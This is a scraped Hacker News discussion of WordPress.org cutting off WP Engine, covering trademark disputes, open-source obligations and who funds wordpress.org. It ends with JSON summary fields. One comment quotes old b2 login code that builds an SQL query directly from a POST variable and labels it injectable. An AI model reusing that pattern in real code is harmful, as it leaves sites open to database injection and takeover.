Most companies I've dealt with would rather pay for commercial software and offload the risk onto the software company that use an Open Source project they view as risky in any way. Companies can already view Open Source projects as risky in a number of ways: lots of drama/turnover in a project, a single BFDL controls everything, viral license. For many projects the rewards from using it outweigh these risks. However, all the above risks can be evaluated before a company decides to build using an Open Source project. If projects are seen as able to block availability unilaterally without a license violation, that's a risk that can't be evaluated before investing perhaps millions using it. Of course, this would all be evaluated and we'd live in a better world if companies heavily using an Open Source project decided to allocate 1% of the software engineering budget as a donation to that project. reply troyvit 4 hours agoparent> If companies can't use Open Source without the risk that the project could ban them from using it, even if the company adheres to the letter of the license (if not the spirit), then most companies won't use Open Source. But access to wordpress.org's servers has nothing to do with Open Source. WP Engine is free to use and modify the WordPress code to their heart's content. They just don't get to use the wordpress.org servers for free anymore. reply slouch 3 hours agorootparentThe software running on those servers was built by volunteers, some of which are now scrambling to help their clients who are blocked from using that software. reply Terretta 6 hours agoparentprev> Most companies I've dealt with would rather pay for commercial software and offload the risk onto the software company that use an Open Source project they view as risky in any way. This seems less applicable when the company is using the software to offer it as that commercial cut-out. reply timeon 4 hours agoparentprevI'm do not want to talk about whole thing, I do not know what to think about that but: > If companies can't use Open Source without the risk that the project could ban them from using it... Isn't this more about infrastructure (wordpress.org)? All plugins are still downloadable and able to install via SFTP. reply wfjackson3 4 hours agoprevThis is one of the worst attempts to handle a corporate dispute that I have ever seen. Forget all of the he said he said arguments for a second and see what a random person who decided to use WordPress will see. If Automatic gets mad at the company I use to host this site, they will randomly start holding my site hostage by deactivating services. No host is safe. I probably shouldn't use WordPress. I don't care who is wrong or right here. This is peak \"cutting off your nose to spite your face\" behavior. reply robjwells 9 hours agoprevHere's Matt Mullenweg's post on Wordpress.org announcing this: https://wordpress.org/news/2024/09/wp-engine-banned/ There is some further discussion in the HN thread on the WP Engine incident: https://news.ycombinator.com/item?id=41655578 reply martin_a 9 hours agoparentI don't understand what the actual problem is. What did WPEngine do to use \"wordpress.org resources\"? That article is very... non-informative. reply robjwells 9 hours agorootparentI believe in this instance he’s referring to WP Engine installations of WordPress pulling from the WP.org plugin & theme registries. There is a longer story in which Mullenweg has claimed that WP Engine does not contribute sufficiently to the WordPress open-source project, and that the use of “WP” in their name supposedly created confusion and infringes the trademarks of the WordPress open-source project. WP Engine disputes this. Of course the elephant in the room is that Mullenweg is the CEO of a rival for-profit WordPress host (Automattic), but has made his claims against WP Engine from his position in the open-source WordPress project. Perhaps a board of non-Automattic WordPress project people would come to the same conclusions about WP Engine, but the current situation reeks of conflict of interest. Ultimately the ones paying the price here are the users of WP Engine-hosted WordPress installations, who have been cut off from plug-in and theme updates with no warning. reply miki123211 8 hours agorootparentWP Engine is also claiming that Mullenweg tried to \"extort\" them. He allegedly asked WP Engine to pay astronomical amounts of money to WordPress, or he'd go on a smear campaign against them. THe demands were allegedly refused, and it seems that he has indeed started such a campaign. The claims were made in an official letter to Automattic that included proof in the form of screenshots, and that was written by a legal professional[1]. I personally think it's unlikely that an actual lawyer would risk their reputation and fabricate something like that. [1] https://news.ycombinator.com/item?id=41631912 reply Terretta 6 hours agorootparent> He allegedly asked WP Engine to pay astronomical amounts of money to WordPress... If we use the word “astronomical” to represent a percentage of profits, what word do we use to describe the profits? reply ceejayoz 4 hours agorootparentWP Engine asserts they demanded \"a significant percentage of its gross revenues\", not profits. I'm not sure we know what their margin is. reply JimDabell 4 hours agorootparentMatt Mullenweg confirmed: > They had the option to license the WordPress trademark for 8% of their revenue, which could be delivered either as payments, people (Five for the Future .org commitments), or any combination of the above. — https://www.reddit.com/r/Wordpress/comments/1fnz0h6/cease_de... reply ceejayoz 8 hours agorootparentprev> I personally think it's unlikely that an actual lawyer would risk their reputation and fabricate something like that. The various disbarred folks from Trump’s 2020 legal team serve as a pretty effective counter example. reply fortyseven 5 hours agorootparent\"How much can I poison the well of public opinion about my high paying client and get away with it.\" reply whizzter 8 hours agorootparentprevConflict of interest, perhaps. Reading about the issues though, gimping the product for pennies and then modifying customers sites to censor things. At some point, every bad behaviour in a software ecosystem affects other parties and even if his personal role does cause a conflict of interest all the things mentioned seems to point to a party that doesn't respect the ecosystem. Reminds me of the whole Elastic search vs Amazon stuff that seems to have mellowed down now. https://www.elastic.co/blog/elasticsearch-is-open-source-aga... reply martin_a 8 hours agorootparentprevI see. What a BS. It's obvious that this is a business move by Automattic. Akismet was (is?!) bundled with every fresh WP installation. That is a product by Automattic, so why is it bundled with the Open Source \"product\"? It's an unfair competitive advantage over every other company/person that provides a plugin for that. Nobody cared or was just feared to pick up that fight. Drawing the line at WPEngine seems random, too. There are so many bigger or smaller competitors in that space, it's just somewhat random to pick them out and complain that they don't give back. Lousy move. reply asmor 9 hours agorootparentprevAutomattic also has a very direct competitor in Pressable - who are currently running a WP Engine contract buyout promotion in their header. Horrid look. reply asmor 9 hours agorootparentprevThis is the equivalent of NPM, Maven or PyPi cutting off an enterprise artifact repository because they don't donate enough to keep those services running. Especially the lack of notice makes it an unprofessional garbage move. reply cies 8 hours agorootparentDoes the notice need to be public? They are fighting for a while, I think WPEngine knew what Automattic demanded (and hence could foresee what happens if they continue). They were/are probably already working on an alternative. reply technion 8 hours agorootparentprevImagine aws offers a hosted node application service. Then, because aws doesn't give anything back, npm blocks the aws ip range, and suddenly existing aws customers can't install modules or security updates. That's pretty much what happened here. I get the \"you should give back\" ideal, but make no mistake, this is because wp engine is eating their lunch. reply cies 8 hours agorootparentAutomattic offers more than just the source code of WP. Anyone is still free to use the source, but the services they provide are not free. > Imagine aws offers a hosted node application service. Then, because aws doesn't give anything back, npm blocks the aws ip range, and suddenly existing aws customers can't install modules or security updates. It's a good analogy. AWS does it a lot, but it does so with open source projects that do not have much paid services. Reading from the article, Automattic provides many services (possibly paid, in some freemium model). I'd welcome if some projects manage to get AWS to give back. They do way too little if you ask me. > I get the \"you should give back\" ideal, but make no mistake, this is because wp engine is eating their lunch. Yes. Giving back could be a deal that involves money. reply danillonunes 1 hour agorootparentI understand it would be ideal for business to give back with money to open source projects, but this issue is being handled in the worst possible way by Matt. So WordPress code is FOSS, so you can theoretically change the code, except when you change the line that will keep revisions to cut your costs, if you do that he will yell at you. WordPress' repository is free as in beer, you can download all you want without paying. Heck, even WP code is setup so it downloads from there by default. Except when you happen to host in a company that has a very specific set of issues (alleged trademark issues + profits over a particular threshold + not giving back to community; other companies who have only one of those issues but not all of them are fine), then he'll block you. The main issue here is the lack of a clear contract of what you can or cannot do. Seems like he is just figuring out the rules along the way. This gives to external observers the impression that the whole thing is unreliable. reply wg0 8 hours agoprevRedis, Elasticsearch, Mongo and now WordPress - it seems that Open source is as good and only good when you and only you can sell it. The moment someone else starts to make money or more money then you could have off your effort, does things better than you to market/host/package your open source project, the moment things to start to fall apart. None of the Open source ethos survive of sharing together, learning together etc. EDIT: typos reply petercooper 3 hours agoparentPostgres, notably, has not had these problems. There's a thriving ecosystem, despite the trademark, and many providers offer \"Postgres\" services without Postgres' core organizations or contributors getting their undies in a twist over it. reply evanelias 20 minutes agorootparentThat's largely true, but there definitely have been incidents/drama in the recent past. Two that come to mind: https://www.postgresql.org/about/news/statement-from-the-pos... https://www.postgresql.org/about/news/trademark-actions-agai... Also worth considering that EDB is backed by Private Equity, and there was some other very recent incident that seemingly directly resulted in OtterTune folding. reply jeswin 8 hours agoparentprev> The moment someone else starts to make money or more money then you could have off your effort Company A spends X% of their revenue on improving the product. Company B spends nothing. Company B will be able to price their product lower, and take Company A's customers. It's not sustainable. The solution is to ask Company B to pay up (in cash or resources), and not be leeching. reply surgical_fire 8 hours agorootparent> Company A spends X% of their revenue on improving the product. Company B spends nothing. Company B will be able to price their product lower, and take Company A's customers. It's not sustainable. Then don't make an open source product. What you can't do is try to earn the goodwill that comes with open source, but also expect the profitability of a proprietary product. reply TheHippo 8 hours agoparentprevIt is not about the code. It is about using other company's server resources. reply ceejayoz 7 hours agorootparentBut they're OK with the use of those resources if WP Engine contributes more code, which makes it... at least partially about the code? reply batuhanicoz 8 hours agoparentprevWordPress has been around for a long time, and there is no change to how open it is. It is GPL code, Automattic is not forking it and selling access to the fork. We are just asking WP Engine to contribute back to the project that they are basing their entire business on. This is primarily a trademark infringement issue, we asked them to give back to be able to use the trademark we have the license for. reply ceejayoz 8 hours agorootparent> This is primarily a trademark infringement issue… There’s a pretty standard way of fighting those out. reply DonnieBurger 8 hours agorootparentprevAre you going to be \"just asking\" other businesses as well? Or does it only apply to competitors of Automattic? reply batuhanicoz 8 hours agorootparentAs long as competitors of Automattic does not infringe on the trademarks owned (in the case of WooCommerce) or licensed (WordPress) by Automattic, I don't see any reason for us taking any action. I would personally ask everyone to at least try to contribute back to the open source projects they rely on though. reply prox 5 hours agorootparentHonestly I tried at one point, but the community was rather hostile and unwelcoming. I help out with Godot sometimes and it’s far more welcoming and low friction. reply pxtail 7 hours agoparentprev> None of the Open source ethos survive of sharing together, learning together etc. Could be because of that missing part of \"sharing together\" replaced with \"taking and not giving back anything in return\" reply fortyseven 5 hours agorootparentEthically it may be the right thing to do, but there is no obligation to do so unless it's in the license. If you want to thumb your nose at WPEngine for that, fine, but that's about as far as that goes. reply Raed667 9 hours agoprevTBH i don't mind this, open-source means you can use the code, but you're not entitled to infra and services. reply batuhanicoz 8 hours agoparentInfra, services and trademarks. They are not part of the GPL license. Everyone is welcomed to use any GPL code as they see fit, as long as they are within their limits as outlined in the license. But this does not mean W.ORG has to keep providing these free services to you and your customers, and it does not mean you are free to use trademarks in a misleading way. Disclaimer: I work at Automattic. reply mikeyinternews 6 hours agorootparentI've been a WPE customer for about 3 years and have never been confused by the \"WP\" in their name. reply seb1204 38 minutes agorootparentWould you agree that WPE automatically makes a mental connection to WordPress? I dare say this would not be the case if it was named Josh Mutton Engine JME reply trvr 5 hours agorootparentprevIt's not about WP in the company name. It's about loosely using the words \"Wordpress\" and \"WooCommerce\" all over their website in ways that violate trademarks. reply graeme 2 hours agorootparentCould you please explain in which way trademarks were violated? Nominative use is explicitly allowed according to long established caselaw. https://en.m.wikipedia.org/wiki/Nominative_use reply trvr 2 hours agorootparentI'm not a lawyer, but WP Engine is selling products on their website literally named \"Core Wordpress\". That seems like it might be a violation. reply graeme 1 hour agorootparentFor there to be a violation there has to be a reasonable prospect of consumer confusion by the consumers in the target market. The page is labelled \"Choose your WordPress Hosting plan\" Someone who is in the market for Wordpress hosting is almost certainly aware they have Wordpress and that they need hosting for it. Wordpress is a nominative use to refer to the entity, and Core is an adjective which in context means central. Do you actually think there are meaningful numbers of people who have believed that WPEngine is actually wordpress itself? That would be the standard. Wordpress.com leads to much more confusion on a regular basis. reply trvr 1 hour agorootparent\"Do you actually think there are meaningful numbers of people who have believed that WPEngine is actually wordpress itself?\" Yes. \"Wordpress.com leads to much more confusion on a regular basis.\" Wordpress.com has a license to use the Wordpress trademark. I don't believe we should be comparing Wordpress.com to WP Engine here. reply graeme 39 minutes agorootparentFair enough on wordpress.com. It still doesn't strike me as plausible that any reasonable person in a purchasing decision thinks WPengine is wordpress itself. I certainly haven't seen any such confusion online. reply asmor 8 hours agoparentprevIf you integrate your code to have hard dependencies on a third party server that is provided for free, that's as much part of an implicit social contract as is channeling a subset of earnings back at a project if you're successful. So it may be okay in this instance, but the no notice part is still bad. WordPress used to not even have a way to have plugins and themes that didn't ask to be updated via WP.org - so you could provoke an update to someone's private plugin if you knew its name. I know because I filed the bug that lead to it being fixed. But everything in this instance is making Matt and his company look bad. Their complaint seems to be that revisions are not enabled by default on WP Engine and this is somehow breaking the core philosophy of WordPress and the few bytes of text WP Engine saves are supposedly profit seeking, not a performance problem as WP Engine claims. Additionally, one of Matt's commercial ventures, Pressable, is currently offering to buy out your WP Engine contract if you switch to them. Breaking a competitors product and then offering to buy out their customers should be a red flag in choosing an open source solution. reply Raed667 8 hours agorootparentI don't have a dog in this fight, but if you built a multi-million business around that code, it is just sane for you to patch the code so that your core business doesn't 100% depend on someone else's free service (plugin marketplace hosting for example) This entire situation screams drama but I can see where Matt is coming from, even though he could have handled things with more grace. reply seb1204 35 minutes agorootparentI also don't have a dog in the fight but reading for a few minutes I have the impression there have been previous attempts to engage with WPE to contribute. I might be wrong. reply vouaobrasil 9 hours agoprevI've used Wordpress self-hosted for a long time and this seems like a non-issue. WPEngine can use the Wordpress codebase but why should they be entitled to the services provided by Wordpress? I say this is a good thing. reply yreg 8 hours agoparent> why should they be entitled to the services provided by Wordpress? They are not entitled to them, but Wordpress has previously decided to offer those services. Wordpress donors most probably expected that these services will continue to be provided to anyone. The controversial part is that now they apparently establish a policy that Matt Mullenweg (the owner of for-profit Wordpress.com) can arbitrarily ban competitors in case he doesn't like them. reply batuhanicoz 8 hours agorootparentWordPress.org (the service that banned WP Engine) is not funded by donors. WordPress Foundation is the non profit entity that has donations. reply yreg 8 hours agorootparentIsn't WordPress.org connected to WordPress foundation? They have a Donate link in the footer. What about all of these: \"user login system, update servers, plugin directory, theme directory, pattern directory, block directory, translations, photo directory, job board, meetups, conferences, bug tracker, forums, Slack, Ping-o-matic, and showcase\" – are all of those services provided by WordPress.org without funding from WordPress foundation? reply batuhanicoz 8 hours agorootparent> are all of those services provided by WordPress.org without funding from WordPress foundation? As far as I am aware, this is correct. reply paulgb 8 hours agorootparentprevInteresting, so then who pays to run wordpress.org? I notice a donate link in the footer, which goes to the foundation, but to your point, the foundation seems to avoid saying outright that the funding goes to running .org (instead saying that Matt has been involved with them) https://wordpressfoundation.org/projects/ reply batuhanicoz 8 hours agorootparentWordPress.org is operated by Matt Mullenweg as a free service that hosts plugins, themes, docs and more. It does not take donations, or as far I am aware, make any profits. Instead, people are encouraged to donate to the Foundation, which helps with the development of WordPress the software and organizes things like WordCamps. reply KomoD 3 hours agorootparentSo why is it hosted on IP addresses associated with the foundation? %rwhois V-1.5:003eff:00 rwhois.singlehop.com (by Network Solutions, Inc. V-1.5.9.5) network:Class-Name:network network:ID:ORG-SINGL-8.198-143-164-0/24 network:Auth-Area:198.143.128.0/18 network:IP-Network:198.143.164.0/24 >>> network:Organization:The Wordpress Foundation network:Street-Address:660 4TH ST # 119 network:City:SAN FRANCISCO network:State:CA network:Postal-Code:94107 network:Country-Code:US network:Tech-Contact;I:NETWO1546-ARIN network:Admin-Contact;I:NETWO1546-ARIN network:Abuse-Contact;I:ABUSE2492-ARIN network:Created:20171214 network:Updated:20171214 reply JimDabell 4 hours agorootparentprevWait, so if somebody goes to WordPress.org, clicks the donate button, arrives at a page to donate to the WordPress Foundation, and donates, that money does not go towards funding WordPress.org? The blurb on the donation page reads: > Money raised by the WordPress Foundation will be used to ensure free access to supported software projects, protect the WordPress trademark, and fund a variety of programs. “Supported software projects” is a link that leads to a page that lists these software projects: - WordPress - WordPress Plugins - WordPress Themes - bbPress - BuddyPress It sure looks like the WordPress infra and plugins are supported by the donations from the WordPress.org footer link. If the money is going elsewhere, where is it going? reply jacooper 8 hours agorootparentprevThis is stupid, something like WordPress.org should obviously be under the foundation, as it's an essential part of the entire wp ecosystem. reply swores 8 hours agorootparentprevI believe that you're mistaken and have flipped them the wrong way round: Wordpress.org is the official website of the open source project owned by the WordPress Foundation, while WordPress.com is the company owned by Automattic. https://wordpress.org/about/ https://en.m.wikipedia.org/wiki/WordPress#WordPress_Foundati... https://wordpressfoundation.org/projects/ https://en.m.wikipedia.org/wiki/Automattic reply batuhanicoz 8 hours agorootparentI work at Automattic, owner of WordPress.com. I asked how WordPress.org is funded and will get details on that but I can tell you WordPress.org is not part of the foundation. Open source project and the WordPress trademark are owned the WordPress Foundation. WordPress.org has a license to use the name from the Foundation, as does Automattic. reply slyall 7 hours agorootparentSo you have: Wordpress.org which is directly controlled by Matt Mullenweg Automattic (ie wordpress.com) whose CEO is Matt Mullenweg and The WordPress Foundation which is run by (checks notes) Matt Mullenweg Yet you seem to think we should treat all three of those entities (Matts?) as separate and independant reply swores 8 hours agorootparentprevThe WordPress Foundation links to wordpress.org as the official site for their project called WordPress, and wordpress.org directs donors to donate at wordpressfoundation.org so it's hard to see how you could be right, but if you can come back explaining that then I'll happily admit to having been confused by it all. reply batuhanicoz 8 hours agorootparentProjects page of the Foundation (https://wordpressfoundation.org/projects/) does not say those projects belong to the Foundation. It states: > Matt Mullenweg, the director of the WordPress Foundation, has been directly involved in the creation of, or coordination of volunteers around, a number of WordPress projects that espouse the core philosophy I'll admit this might sound confusing. Foundation came years after some of these projects were already established. reply ceejayoz 3 hours agorootparentIf https://www.gatesfoundation.org/ had a page titled \"Projects\" that listed \"death camps\" as the first item, you would assume they're up to something, right? reply KomoD 3 hours agorootparentprevThey do link to wordpress.org outside of that. https://wordpressfoundation.org/contact/ says \"a violation of our domain policy.\" and links to wordpress.org, why would their domain policy be on a site that isn't theirs? And then wordpress.org says \"For various reasons related to our WordPress trademark\", how can wordpress.org say \"our\" if the foundation owns the WordPress trademark and .org is not run by the foundation? > Projects page of the Foundation (https://wordpressfoundation.org/projects/) does not say those projects belong to the Foundation. It states: But their site does say that money raised will be \"used to ensure free access to supported software projects, protect the WordPress trademark, and fund a variety of programs.\" and links to the projects page that contains wordpress.org... but you said it isn't funded by the donations from the foundation reply danillonunes 1 hour agorootparentprevIronic how this whole thing started with an allegation that WP Engine makes things confusing. I wonder if Matt's mom can tell the difference between WordPress Foundation and WordPress.org. reply openplatypus 10 hours agoprevLikely the aftermath of https://techcrunch.com/2024/09/22/matt-mullenweg-calls-wp-en... reply 3np 10 hours agoparentBetween all the threads, this video is the best for context I think. Juicy part start around 10min. https://www.youtube.com/watch?v=fnI-QcVSwMU reply joshstrange 7 hours agoprevThis is _so_ rich coming from Wordpress who offers a bastardized version of Wordpress themselves on Wordpress.com I wish I had never given Wordpress any money. reply ChrisArchitect 4 hours agoprev[dupe] Discussion on official post: https://news.ycombinator.com/item?id=41652760 reply itsdrewmiller 5 hours agoprevI’m a little surprised WPE didn’t have some kind of contingency plan for this in place already, even if it was just to handle a Wordpress.org outage. reply throwbmw 8 hours agoprevRelated: https://zedshaw.com/blog/2022-02-05-the-beggar-barons/ reply chx 9 hours agoprevThis destroys the Wordpress ecosystem in one move. Who is going to pick Wordpress after this for a project if the Wordpress leader can hamstring their site for reasons completely outside of their control? This entire debacle also hurts the entire open source community. Look, if you think there's a trademark violation then sue them for it by all means (but since they let this go for so many years the outcome of this likely will be cancellation of the trademark) but the rest? just don't. Edit: by \"the entire debacle\" I meant not this specific even but how WP Engine claimed Mullenweg demanded money, slandered them , all that. reply tgv 9 hours agoparent> This entire debacle also hurts the entire open source community How so? IIUC, WordPress blocks access to their servers. Those are not part of \"open source\". reply phoronixrly 9 hours agorootparentOpen source has nothing to do with free support/development and... now apparently it needs to be said out loud that it has nothing to do with free hosting... reply DonnieBurger 9 hours agorootparentprevHow about using the WordPress Foundation, a non-profit, to attack a for-profit's competitors. They could lose their tax-exempt status. reply shakna 9 hours agorootparentA nonprofit removed access to resources from a for-profit, with whom they did not have a contract. That's a non starter. reply DonnieBurger 8 hours agorootparentThere is more to the story than just this event. For context: https://wpengine.com/wp-content/uploads/2024/09/Cease-and-De... https://automattic.com/2024/wp-engine-cease-and-desist-exhib... reply JonAtkinson 9 hours agorootparentprevBecause in a few months, people won't remember the details, but they will remember \"the time the Wordpress guy abused his influence to damage the Wordpress ecosystem\". reply pxtail 8 hours agorootparentOr, alternatively they could remember \"the time the Wordpress guy smacked freeloader leeching off the Wordpress ecosystem\" Apart from that - major turbulences in the WP and in general CMS world could be a positive thing. Maybe it's time for a new player in the space. Wordpress absolute dominance for basically decades kind of sucks air out of the space for competitors, there are some like Ghost and others but they are barely crawling compared to WP market share. Apart from that even fork within WP itself wouldn't necessary be a bad thing - some decisions and direction of the WP itself are questionable looking from developer standpoint like bringing to life insanely complicated React-based toolkit as WP editor building block, archaic conventions in the PHP codebase, lack of standardized patterns and guidelines for plugins creation and many more. Personally I would love to have PHP-based CMS, built either based on Symphony or Laravel with extensive plugins and theming, capabilities and resonable market share. reply chx 6 hours agorootparentA PHP based CMS based on Symfony with extensive plugins and theming, capabilities and some market share? https://w3techs.com/technologies/comparison/cm-drupal,cm-wor... reply pxtail 5 hours agorootparentYeah, I recently looked into their \"Starshot\"[0] initiative to make their CMS more appealing and it's interesting to some degree, but we'll see when it comes out - presumably ~ Jan 15, according to the video [0] https://www.youtube.com/watch?v=Wce6FkNN2Io reply chx 9 hours agorootparentprevI meant the entire debacle not this specific one. WP Engine claimed Mullenweg demanded money, slandered them , all that. reply nailer 9 hours agoprev> Mullenweg set up in 2005 to monetize the project he’d created two years previous Wordpress is a fork of an older project which was not made by Matt. reply lnxg33k1 9 hours agoparentIt's important to point out, since probably the whole automattic is still leeching from b2 and hasn't added anything reply kgeist 9 hours agorootparentJust checked out the original version of b2 Wordpress was forked from and could immediately spot a SQL injection which I can use to take over the whole site: $log = $HTTP_POST_VARS[\"log\"];$user_login=$log;SELECT ID, user_login, user_pass FROM $tableusers WHERE user_login = '$user_login' AND MD5(user_pass) = '$password' Later it also stores the hashed password as a cookie. Some quality 2003 code :) reply admissionsguy 9 hours agorootparentNot necessarily if magic quotes are enabled!! reply lnxg33k1 7 hours agorootparentprev2003? If I remember correctly, SQL injection has been in OWASP Top 10 until 2016 reply kgeist 6 hours agorootparentThe code is from 2003. reply lnxg33k1 5 hours agorootparentYeah, I got that, it's just that could as well be more recent^^ reply rado 8 hours agoprevAlways found it interesting that the core WP lacks CDN support, caching, multilingual etc out of the box and leverages the paid WP.com, while using open source contributions. reply jaggs 8 hours agoprevWonderful to see how HN supports a private equity grab rather than a company which has consistently championed open source for decades. Matt could easily have sold out, but he didn't. He built the whole thing from scratch (I remember him answering support emails personally), it would be nice to cut him some slack against a bunch of corporate raiders. But hey, what do I know? reply Sebb767 3 hours agoparentIt looks like Matt is using the WordPress non-profit to attack a competitor. Additionally, he cut off services to that competitor with the clear intent of disrupting their service and customers and talks about trademark infringement, despite their use of the trademark clearly being covered by their very own guidelines, and, to literally add insult to injury, he describes the situation in very emotional language. It's not like I don't see Matts side, but the way he is acting is extremely unprofessional and looks like a temper tantrum. WPEngine might be a large business, but so is Automattic and this kind of scorched earth-approach is hard to support. reply throwbmw 4 hours agoparentprevAgree 100 percent. Perhaps the present generation doesn't know about the early days of Wordpress. Also, all this wording may be because Matt is very committed and so emotional about the protection of open source projects reply hackerbeat 4 hours agoparentprev100% reply ahmedfromtunis 9 hours agoprev [–] I don't use any their products, so I don't have any community insider insights, but based on what I've read so far, it seems like WordPress did the right thing. If another company is profiting from the '.org' ressources (very heavily I'd imagine) without contributing back, then they need to be cutoff. reply sureIy 9 hours agoparentMakes no sense. Everyone is profiting off WordPress and probably 0.1% of those ever contributed back. Either you give away your product or you don’t. It’s obvious the guy is being an absolute PITA because he can. This isn’t even his first time. Check out what happened with thesis dot com. reply ahmedfromtunis 9 hours agorootparentI don't think the issue is about WordPress, the open source software, but rather about using up ressources on the wordpress.org servers. reply DonnieBurger 9 hours agorootparentI think the issue is using a non-profit (WordPress) to suppress a for-profit's (Automattic's) competition. reply Arnt 8 hours agorootparentI heard that there was an old handshake agreement that WPEngine should contribute so-and-so many developer hours to Wordpress per employee, but doesn't now and hasn't for a while. At some point the CEO of Automattic, which does contribute developer hours, blew up. reply 1116574 9 hours agorootparentprevYep, Matt (wordpress guy) has a dramatic writing style, but in essence WPE is using plugins, their security research, user system, theming store etc, without contributing back that much. Worth adding that WPE is owned by private equity, and they allegedly tried to remove the newsfeed from wp-admin to hide his (dramatic) posts about them reply dncornholio 9 hours agorootparentMy company is also a heavy user of WordPress and never have contributed. We also hide those widgets. Do we need to be blocked as well then? reply manuelmoreale 8 hours agorootparentDoes your company offer a competitor to what Automattic is offering, taking revenues from them, and make 500+ millions in revenues a year? If the answer to those is yes then I’d probably keep quiet before Matt notices you :) reply Arnt 8 hours agorootparentprevOpen source is a gift. There's etiquette involved. Suppose one of your developers writes on twitter that you don't permit contribution, and you fire that developer on the next day. What reaction do you expect from the people who pay for most of the development? reply cldellow 5 hours agorootparentI keep seeing people refer to this tweet. Can you share a link to it, please? reply austhrow743 8 hours agorootparentprevSeems like you should act as if you will be. reply rglullis 8 hours agorootparentprevIs your company building a business with half a billion of dollars in revenue out the uncountable amount of man-hours put into Wordpress development? reply dncornholio 8 hours agorootparentWe probably made a lot more then that in the past 20 years. reply rglullis 6 hours agorootparentWe are talking about yearly revenues here, and something tells me that your company is not in the business of selling services that depend on WordPress code being developed reply batuhanicoz 8 hours agorootparentprevHiding the widgets isn't the main issue. If you infringe the WordPress trademark in commercial use, and ignore any attempt to make it right, and pursue legal action, W.ORG does not have to provide those free services to you. I'm guessing you are not size of WP Engine and Silver Lake, honest question, if you were, would you want to contribute back to WordPress? reply sureIy 8 hours agorootparentprevI keep not getting it. WordPress.org is offered as a free download and it accesses the website FOR FREE. Complaining that people don’t pay for free stuff is not a healthy mental state. WP Engine is no different from the million hostings that auto-install WordPress and “abuse” their resources. reply startages 9 hours agorootparentprevWordPress Foundation is paying for the servers, so I guess they have the right to choose who gets access or not. Using the resources as a single person or a small business is not the same as using them from a hosting company with millions of websites. Other hosting companies contribute to the foundation which keeps the service running. If WPEngine isn't contributing anything, it would be unfair for other contributors/sponsors. Especially that they are making a large amount of money from it. reply seb1204 49 minutes agorootparentAs so often I think it would be beneficial for the conversation to provide some more context. Single user install generated load VS WP generated load on the infrastructure of WordPress.org reply sureIy 8 hours agorootparentprevHow would you feel if WordPress.org suddenly decided to lock ALL installations across the world and ask for $800/site/month to access it? Is it their right? Sure. I don’t think you’d be here defending them though. reply appendix-rock 9 hours agorootparentprevYou’re moving the goalposts. We aren’t talking about who has a right to what. We’re talking about what is and what isn’t a deranged dick move. reply bawolff 8 hours agoparentprevWas there ever any attempt to reach some sort of agreement on what appropriate usage would be? I imagine if this was the real issue, then WPEngine could probably sort out some fair solution to not use more than their fair share. I dont know much about this ecosystem but surely a caching proxy is not hard to setup. However reading between the lines, it sounds like the real issue is that WPEngine is more succesful which is making other players jealous, who are using their control over other parts of the ecosystem to give WPEngine the middle finger. In such a case its not really about resourse usage. reply batuhanicoz 8 hours agorootparentWe made many attempts to communicate and solve these issues long before it was made public. They were asked to contribute back, either in cash or in people hours and they refused. reply fortyseven 5 hours agorootparentWell, I hope the blow to the reputation was worth it. Regardless of what is claimed to have happened behind the scenes, the very public meltdown is what's going to live on. It's already sowing doubt internally, where I work, about recommending WordPress in general going forward. reply 2Gkashmiri 9 hours agoparentprev [–] what do you mean profiting. .org is open source. where in the open source licenses you are supposed to pay the original maintainer a share of your revenue or contribute back in code? free software gives 4 freedoms. none of them say about contributing back. they only talk about freedom of source code. same for OSI approved licenses. they are either permissive, MIT aka, do whatever you want or like AGPL provide source code but none that i can think of forces downstream users to contribute back to main. reply bayindirh 8 hours agorootparent [–] Think in infrastructure costs. A simple VPS is around $5/mo which is enough for some users. When you're running a company which has tons of users, all of them are doing updates, theme pulls and whatnot. ..and WPEngine channels all these requests to wordpress.org. This creates tons of load on said .org servers. When you singlehandedly can increase the load number on an infrastructure, the owner of the infrastructure can tell you to stop. This is nothing to do with the four freedoms of software. SourceHut had to endure something similar due to Go package repository, and they made an agreement about the bandwidth management. I'm ha huge GPL fan, but this doesn't mean somebody can abuse their servers' resources while making tons of money because of freeloading on somebody else's servers. reply bawolff 8 hours agorootparent [–] Yes, but just because you can do something, doesn't mean it isn't a dick move. If you are offering an API to the public, generally its considered nice if you document what is considered reasonable traffic and if someone is going above it, give them some notice before cutting them off (unless the amount of traffic is so much its affecting availability). In this case, it doesn't seem to be about the amount of traffic at all. It doesn't seem like WPEngine was abusing the service at all but using it in the way it was expected to be used. It seems like the operator of the service has a financial interest in making WPEngine's life difficult, so they suddenly cut them off. Do they have the right to do that? Sure. Is it a dick move? Definitely. Especially since no notice was given and it doesn't really seem like the amount of traffic or other policy violation was the issue at hand. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "WordPress.org has banned WP Engine from accessing its resources, including themes and plug-ins, due to ongoing legal disputes.",
      "This ban prevents WP Engine users from installing or updating plug-ins and themes, raising significant security concerns.",
      "The conflict involves accusations of trademark violations and misuse of control, with both sides engaging in legal actions following public criticism from WordPress co-creator Matt Mullenweg."
    ],
    "commentSummary": [
      "WordPress.org has banned WP Engine from accessing its resources, leading to controversy and debate within the community.",
      "Critics claim Automattic, a competitor, is using WordPress.org's resources unfairly in a business dispute, raising concerns about potential power abuse.",
      "The situation underscores the complexities of open-source contributions and the responsibilities of large companies, with some suggesting clearer rules for contributions based on company size."
    ],
    "points": 96,
    "commentCount": 152,
    "retryCount": 0,
    "time": 1727339774
  },
  {
    "id": 41658733,
    "title": "Hacking Kia: Remotely Controlling Cars with Just a License Plate",
    "originLink": "https://samcurry.net/hacking-kia",
